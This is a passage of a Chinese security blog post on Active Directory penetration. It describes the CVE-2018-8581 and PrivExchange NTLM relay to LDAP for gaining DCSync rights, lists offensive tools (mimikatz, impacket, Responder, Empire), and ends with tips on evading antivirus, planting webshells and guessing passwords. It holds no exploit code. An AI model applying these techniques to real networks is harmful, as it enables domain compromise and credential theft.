+<li><p>exchange允许任何用户为推送订阅（Push Subscription）指定所需的URL，服务器将尝试向这一URL发送通知。这一漏洞之所以存在，是因为Exchange Server使用CredentialCache.DefaultCredentials进行连接：<br><img src="https://mmbiz.qpic.cn/mmbiz_png/wpkib3J60o2ibpT5faJPylYMGzvQhuyY1FVecPKQrOxGicg5TzrHguuiasGFrACTIBCPlxqXFvvvVmMdD8pavLRMZg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" alt="avatar"></p>
+<p>  CredentialCache.DefaultCredentials 会使 exchange 将 net-ntlm（注意不是NTLM） 发送到攻击者服务器。且exchange默认如下注册表项</p>
+  <figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>ontrol<span class="hljs-symbol">\L</span>sa<span class="hljs-symbol">\D</span>isableLoopbackCheck = 1<br></code></pre></td></tr></table></figure>
+<p>  并未开启relay_back检查，因此我们可以将NTLM返回exchange的ews接口用于http认证，我们可以在soap头里伪造任意用户<br>  <img src="https://mmbiz.qpic.cn/mmbiz_png/wpkib3J60o2ibpT5faJPylYMGzvQhuyY1FZ5VESEWN4XurbicaQX6lhYQhff6M28guMxYXibLJkiaGZITwKFGMfqHYQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" alt="avatar"></p>
+<ul>
+<li>利用工具：<a target="_blank" rel="noopener" href="https://github.com/WyAtu/CVE-2018-8581">https://github.com/WyAtu/CVE-2018-8581</a><h3 id="域管权限"><a href="#域管权限" class="headerlink" title="域管权限"></a>域管权限</h3></li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>全域dcsync需要权限，我们可以通过添加两条ACL来使用户获得权限：</p>
+  <figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">‘DS-Replication-Get-Changes’     = 1131f6aa<span class="hljs-string">-9</span>c07<span class="hljs-string">-11</span>d1-f79f<span class="hljs-string">-00</span>c04fc2dcd2<br>‘DS-Replication-Get-Changes-All’ = 1131f6ad<span class="hljs-string">-9</span>c07<span class="hljs-string">-11</span>d1-f79f<span class="hljs-string">-00</span>c04fc2dcd2<br></code></pre></td></tr></table></figure>
+<p>  <code>Exchange Windows Permissions,Exchange Trusted Subsystem</code> 组成员都具有Write-ACL权限，则exchange机器拥有添加ACL的权限，所以我们在拿到Exchange机器的http请求的时候，可以将请求Relay到Ldap,然后由于Exchange机器用户具备Write-ACL权限，我们在域内给添加两条acl，acl的受托人可以是任意用户。从而使该用户具备Dcsync的权限。</p>
+</li>
+<li><p>利用工具：</p>
+<ul>
+<li><code>privexchange.py</code> : <a target="_blank" rel="noopener" href="https://github.com/dirkjanm/PrivExchange">https://github.com/dirkjanm/PrivExchange</a></li>
+<li><code>ntlmrelayx.py、secretsdump.py</code> : <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
+</ul>
+</li>
+<li><p>攻击步骤：</p>
+<ol>
+<li><p>使用 <code>ntlmrelayx</code> 监听端口进行等待连接<br><img src="https://p3.ssl.qhimg.com/t01516372c096f87a37.png" srcset="/img/loading.gif" alt="avatar"></p>
+</li>
+<li><p>发起推送订阅指定所需的URL，Exchange. 服务器将尝试向这个URL发送通知<br><img src="https://p3.ssl.qhimg.com/t017673212a17449f39.png" srcset="/img/loading.gif" alt="avatar"></p>
+</li>
+<li><p>Relay 到域控的Ldap 服务器并给普通用户daiker添加两条acl<br><img src="https://p3.ssl.qhimg.com/t017f6e513d75746385.png" srcset="/img/loading.gif" alt="avatar"></p>
+</li>
+<li><p>用户即拥有了dcsync权限</p>
+</li>
+</ol>
+</li>
+</ul>
+<h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><ul>
+<li><p>mimikatz（没啥说的，神器）</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
+</blockquote>
+</li>
+<li><p>impacket（python写的集成工具集,里面有功能类似的工具，可能不被杀）</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
+</blockquote>
+</li>
+<li><p>responder（利用wpad和中继抓取凭证，当一筹莫展时可以试试）</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></p>
+</blockquote>
+</li>
+<li><p>empire （后渗透框架）</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></p>
+</blockquote>
+</li>
+<li><p>ruler （exchange渗透工具）</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a></p>
+</blockquote>
+</li>
+<li><p>kerberoast (kerberoast工具)</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p>
+</blockquote>
+</li>
+<li><p>cmdkey （命令行添加认证凭证方便）</p>
+</li>
+<li><p>…</p>
+<p>  (o’&gt;’o) 以后想到啥再加吧 </p>
+</li>
+</ul>
+<h2 id="域渗透思路："><a href="#域渗透思路：" class="headerlink" title="域渗透思路："></a>域渗透思路：</h2><p>这个就是个人瞎逼逼了：一般一进去就是域控的情况很少（还是遇到过），有的时候进去都不是域内机器。基本思路无非就是：抓密码-&gt;移动-&gt;抓密码，所以前期的信息收集很重要。一般服务账户权限都很高，比如exchange。所以尝试的时候先尝试服务账户。远程执行的时候一定先看杀软，有厉害的比如eset、fireye之类的就要谨慎一点，mimikatz啥的就别传了，必杀。域内一般还是比外网好搞的，所以一定要自己动手搭环境自己试试。</p>
+<p>一般进入内网先要摸清内网结构，大的目标会有杀软和防火墙，所以别用动静太大的扫描器比如nmap，尽量找轻量级的扫描器，线程少或干脆单线程，网络内所有存活主机，所有开放端口和运行服务都要高清楚，内网一般危险服务很多，比如 telnet、redis等.开80等web端口的做好内网代理访问看看，推荐 <code>HTTPScreenshot</code> 这个工具。然后的思路就和外往差不多，想办法拿权限，抓到hash以后去别的机器尝试，如此往返。</p>
+<hr>
+<p>更新：域信息收集很重要，定位好域控，datacenter，数据库，web服务器等。本地system的口令多碰一碰，大概率可以碰到好多台。多翻翻文件，看看共享。记住，能不上工具就不上工具。</p>
+<p>有权限了多放webshell，大部分会做反代，内网ping域名找机器，反代nginx的代理池springpool里会有详细的配置。口令找找规则，猜一猜，说不定就猜到了。</p>
+<h2 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h2><ul>
+<li><p>三好学生博客</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/">https://3gstudent.github.io/</a></p>
+</blockquote>
+</li>
+<li><p>从零开始内网渗透学习</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/l3m0n/pentest_study">https://github.com/l3m0n/pentest_study</a></p>
+</blockquote>
+</li>
+<li><p>内网渗透知识基础及流程</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/170471">https://www.anquanke.com/post/id/170471</a></p>
+</blockquote>
+</li>
+<li><p>我所了解的内网渗透——内网渗透知识大总结</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/92646">https://www.anquanke.com/post/id/92646</a></p>
+</blockquote>
+</li>
+<li><p>Dirk-jan Mollema 博客</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://dirkjanm.io/">https://dirkjanm.io/</a></p>
+</blockquote>
+</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/AD/">AD</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/AD/">AD</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/02/03/2020-0688/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">cve-2020-0688</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
